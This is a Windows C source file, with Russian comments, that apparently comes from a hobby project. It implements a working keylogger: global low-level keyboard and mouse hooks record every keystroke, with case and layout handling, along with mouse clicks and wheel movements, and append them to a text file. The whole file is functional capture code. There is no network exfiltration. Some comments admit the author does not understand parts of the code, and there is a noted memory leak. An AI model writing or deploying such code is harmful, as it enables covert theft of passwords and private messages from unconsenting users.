
#include <windows.h>
#include <stdio.h>
#define STRING_SIZE 20
#define RUS 1049
#define ENG 1033
#define PATH L"Text.txt"


LRESULT CALLBACK MouseKey(int, WPARAM, LPARAM);
void WriteToFile(LPWSTR);
LRESULT CALLBACK KeyBoardKey(int , WPARAM , LPARAM );

int WINAPI WinMain(HINSTANCE hlnstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HHOOK hHookMouse = SetWindowsHookExW(WH_MOUSE_LL, MouseKey, NULL, NULL);
	HHOOK hHookKeyBoard = SetWindowsHookExW(WH_KEYBOARD_LL, KeyBoardKey, NULL, NULL);
	MSG msg = { 0 };
	while (GetMessageW(&msg, 0, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	UnhookWindowsHookEx(hHookMouse);
	UnhookWindowsHookEx(hHookKeyBoard);
	return 0;

}

BOOL IsCaps() // функция проверки регистра клавиши
{
	if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0 ^ (GetKeyState(VK_SHIFT) & 0x8000) != 0)
	{
		return TRUE;
	}
	return FALSE;
}

LRESULT CALLBACK KeyBoardKey(int iCode, WPARAM wParam, LPARAM lParam)// функция для hook обрабатывающая нажатие клавиатуры
{
	if (wParam == WM_KEYDOWN)
	{
		PKBDLLHOOKSTRUCT pHook = (PKBDLLHOOKSTRUCT)lParam; // структура в которой хранится данные клавиши 
		//char c = (char)pHook->vkCode; //так тоже можно получить буквы, но клавиши типа "пробел" не будут записываться
 		WORD KeyLayout = LOWORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0))); // нужен для определения расскладки
		DWORD iKey = MapVirtualKey(pHook->vkCode, NULL) << 16; // получаем код клавиши и сдвигаем кго на 16 битов влево
		if (!(pHook->vkCode <= 1 << 5)) // не знаю что это
		{
			iKey |= 0x1 << 24;
		}
		
		LPWSTR KeyStr = (LPWSTR)calloc(STRING_SIZE + 1, 2); // строка в которую бкдем записывать названия нажатых клавиш
		GetKeyNameTextW(iKey, KeyStr, STRING_SIZE); // получаем названия клавиш и записываем в строку
		if (wcslen(KeyStr) > 1) // проверка того что клавиша не системная (тип "пробел")
		{ 
			WriteToFile(L"[");
			WriteToFile(KeyStr);
			WriteToFile(L"]");
		}
		else
		{
			if (!IsCaps())// проверка того что клавиша не в верхнем регистре
			{
				KeyStr[0] = tolower(KeyStr[0]);
			}
			WriteToFile(KeyStr); // запись в файл
		}
		free(KeyStr);
	}
	return CallNextHookEx(0, iCode, wParam, lParam);
}

LRESULT CALLBACK MouseKey(int iCode, WPARAM wParam, LPARAM lParam)//hook для мыши
{
	LPWSTR KeyStr = (LPWSTR)calloc(STRING_SIZE, 2); // строка в которую записываем название нажатой кнопку
	MSLLHOOKSTRUCT* p = (MSLLHOOKSTRUCT*)lParam; // струтктура содержащая инфу о колёсике (использую чтобы понять в какую сторону крутится колёсико)
	switch (wParam)
	{
	case WM_LBUTTONDOWN: //левая кнопка мыши
		KeyStr = L"[ЛКМ]";
		WriteToFile(KeyStr);
		break;
	case WM_RBUTTONDOWN: //правая кнопка мыши
		KeyStr = L"[ПКМ]";
		WriteToFile(KeyStr);
		break;
	case WM_MBUTTONDOWN: // нажатие на колёсик
		KeyStr = L"[СКМ]";
		WriteToFile(KeyStr);
		break;
	case WM_MOUSEWHEEL:	// колёсико крутится 	
		if ((*p).mouseData == 4287102976)//4287102976 вниз (так-то должно быть отрицательное, но почему то не отрицательное)
		{
			KeyStr = L"[КОЛЁСИКО_ВНИЗ]";
			WriteToFile(KeyStr);
		}
		if ((*p).mouseData == 7864320)//7864320 вверх (так-то должно быть положитнльное)
		{
			KeyStr = L"[КОЛЁСИКО_ВВЕРХ]";
			WriteToFile(KeyStr);
		}
		break;
	}
	//free(KeyStr); //почему то не работает
	return CallNextHookEx(0, iCode, wParam, lParam);
}

void WriteToFile(LPWSTR str) // функция для записи в файл
{
	FILE* file;
	_wfopen_s(&file, PATH, L"ab");
	if (file != NULL)
	{
		int a = wcslen(str);
		fwrite(str, sizeof(WCHAR), wcslen(str), file);
		fclose(file);
	}
}